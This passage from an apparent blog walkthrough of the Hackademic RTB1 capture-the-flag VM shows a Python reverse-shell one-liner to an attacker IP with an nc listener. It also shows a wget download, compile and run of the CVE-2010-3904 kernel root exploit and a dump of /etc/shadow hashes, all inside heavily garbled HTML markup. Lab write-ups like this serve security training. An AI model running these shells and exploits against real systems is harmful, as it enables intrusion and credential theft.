</span><span class='line'><span class="nb">define</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">WPLANG</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;/&lt;</span><span class="nx">em</span><span class="o">&gt;</span> <span class="nx">Stop</span> <span class="nx">editing</span> <span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;/&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nb">define</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">ABSPATH</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="nb">dirname</span><span class="p">(</span><span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">FILE</span><span class="o">&lt;/</span><span class="nx">strong</span><span class="o">&gt;</span><span class="p">)</span><span class="o">.&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="k">require_once</span><span class="p">(</span><span class="nx">ABSPATH</span><span class="o">.&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">wp</span><span class="o">-</span><span class="nx">settings</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Because our web shell doesn&rsquo;t have assigned tty, we use python to create another reverse shell:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>@HackademicRTB1:/tmp <span class="nv">$ </span>sudo -l
</span><span class='line'>sudo: sorry, you must have a tty to run sudo
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">root</span><span class="nd">@kali32</span><span class="p">:</span><span class="o">~</span><span class="c"># nc -lp 1338&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="nd">@HackademicRTB1</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span> <span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">os</span><span class="o">,</span><span class="nn">pty</span><span class="p">;</span> <span class="n">_</span><span class="p">,</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">;</span> <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">();</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)));</span> <span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">fd</span><span class="p">)</span> <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)];</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">80.137</span> <span class="mi">1338</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>For privilege escalation, we use the following exploit:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali32</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">exploitdb</span><span class="err">#</span> <span class="n">head</span> <span class="n">platforms</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="mf">15285.</span><span class="n">c</span>
</span><span class='line'><span class="c1">//source: &lt;a href=&quot;http://www.vsecurity.com/resources/advisory/20101019-1/&quot;&gt;http://www.vsecurity.com/resources/advisory/20101019-1/&lt;/a&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;/*</span>
</span><span class='line'> <span class="o">*</span> <span class="n">Linux</span> <span class="n">Kernel</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">=</span> <span class="mf">2.6.36</span><span class="o">-</span><span class="n">rc8</span> <span class="n">RDS</span> <span class="n">privilege</span> <span class="n">escalation</span> <span class="n">exploit</span>
</span><span class='line'> <span class="o">*</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2010</span><span class="o">-</span><span class="mi">3904</span>
</span><span class='line'> <span class="o">*</span> <span class="n">by</span> <span class="n">Dan</span> <span class="n">Rosenberg</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#x6f;&amp;#58;&amp;#100;&amp;#x72;&amp;#111;&amp;#115;&amp;#x65;&amp;#x6e;&amp;#x62;&amp;#101;&amp;#114;&amp;#103;&amp;#x40;&amp;#118;&amp;#x73;&amp;#101;&amp;#99;&amp;#117;&amp;#x72;&amp;#x69;&amp;#116;&amp;#x79;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#109;&quot;</span><span class="o">&gt;&amp;</span><span class="err">#</span><span class="n">x64</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x72</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x6f</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">115</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">101</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">110</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">98</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">101</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">114</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x67</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x40</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x76</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">115</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">101</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x63</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x75</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">114</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">105</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x74</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">121</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x2e</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x63</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">111</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">109</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
</span><span class='line'> <span class="o">*</span>
</span><span class='line'> <span class="o">*</span> <span class="n">Copyright</span> <span class="mi">2010</span> <span class="n">Virtual</span> <span class="n">Security</span> <span class="n">Research</span><span class="p">,</span> <span class="n">LLC</span>
</span><span class='line'> <span class="o">*</span>
</span><span class='line'> <span class="o">*</span> <span class="n">The</span> <span class="n">handling</span> <span class="n">functions</span> <span class="k">for</span> <span class="n">sending</span> <span class="n">and</span> <span class="n">receiving</span> <span class="n">RDS</span> <span class="n">messages</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.0<span class="nv">$ </span>wget <span class="p">&amp;</span>ndash<span class="p">;</span>no-check-certificate &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://www.exploit-db.com/download/15285&quot;</span>&gt;https://www.exploit-db.com/download/15285&lt;/a&gt; -O a.c
</span><span class='line'>bash-4.0<span class="nv">$ </span>gcc a.c
</span><span class='line'>gcc a.c
</span><span class='line'>bash-4.0<span class="nv">$ </span>./a.out
</span><span class='line'>./a.out
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Linux kernel &gt;<span class="o">=</span> 2.6.30 RDS socket exploit
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> by Dan Rosenberg
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Resolving kernel addresses<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved security_ops to 0xc0aa19ac
</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved default_security_ops to 0xc0955c6c
</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved cap_ptrace_traceme to 0xc055d9d7
</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved commit_creds to 0xc044e5f1
</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved prepare_kernel_cred to 0xc044e452
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Overwriting security ops<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Overwriting <span class="k">function</span> pointer<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Triggering payload<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Restoring <span class="k">function</span> pointer<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Got root!
</span><span class='line'>sh-4.0# id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;sh-4.0# cat /etc/shadow
</span><span class='line'>cat /etc/shadow
</span><span class='line'>root:<span class="nv">$6$4l1OVmLPSV28eVCT$FqycC5mozZ8mqiqgfudLsHUk7R1EMU</span>/FXw3pOcOb39LXekt9VY6HyGkXcLEO.ab9F9t7BqTdxSJvCcy.iYlcp0:14981:0:99999:7:::
</span><span class='line'>bin:&lt;em&gt;:14495:0:99999:7:::
</span><span class='line'>daemon:&lt;/em&gt;:14495:0:99999:7:::
</span><span class='line'>adm:&lt;em&gt;:14495:0:99999:7:::
</span><span class='line'>lp:&lt;/em&gt;:14495:0:99999:7:::
</span><span class='line'>sync:&lt;em&gt;:14495:0:99999:7:::
</span><span class='line'>shutdown:&lt;/em&gt;:14495:0:99999:7:::
</span><span class='line'>halt:&lt;em&gt;:14495:0:99999:7:::
</span><span class='line'>mail:&lt;/em&gt;:14495:0:99999:7:::
</span><span class='line'>uucp:&lt;em&gt;:14495:0:99999:7:::
</span><span class='line'>operator:&lt;/em&gt;:14495:0:99999:7:::
</span><span class='line'>games:&lt;em&gt;:14495:0:99999:7:::
</span><span class='line'>gopher:&lt;/em&gt;:14495:0:99999:7:::
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;ftp:*:14495:0:99999:7:::&quot;</span>&gt;ftp:*:14495:0:99999:7:::&lt;/a&gt;
</span><span class='line'>nobody:*:14495:0:99999:7:::
</span><span class='line'>vcsa:!!:14557::::::
</span><span class='line'>avahi-autoipd:!!:14557::::::
</span><span class='line'>ntp:!!:14557::::::
</span><span class='line'>dbus:!!:14557::::::
</span><span class='line'>rtkit:!!:14557::::::
</span><span class='line'>nscd:!!:14557::::::
</span><span class='line'>tcpdump:!!:14557::::::
</span><span class='line'>avahi:!!:14557::::::
</span><span class='line'>haldaemon:!!:14557::::::
</span><span class='line'>openvpn:!!:14557::::::
</span><span class='line'>apache:!!:14557::::::
</span><span class='line'>saslauth:!!:14557::::::
</span><span class='line'>mailnull:!!:14557::::::
</span><span class='line'>smmsp:!!:14557::::::
</span><span class='line'>smolt:!!:14557::::::
</span><span class='line'>sshd:!!:14557::::::
</span><span class='line'>pulse:!!:14557::::::
</span><span class='line'>gdm:!!:14557::::::
</span><span class='line'>p0wnbox.Team:<span class="nv">$6$rPArLuwe8rM9Avwv$a5coOdUCQQY7NgvTnXaFj2D5SmggRrFsr6TP8g7IATVeEt37LUGJYvHM1myhelCyPkIjd8Yv5olMnUhwbQL76</span>/:14981:0:99999:7:::
</span><span class='line'>mysql:!!:14981::::::
</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
</feed>
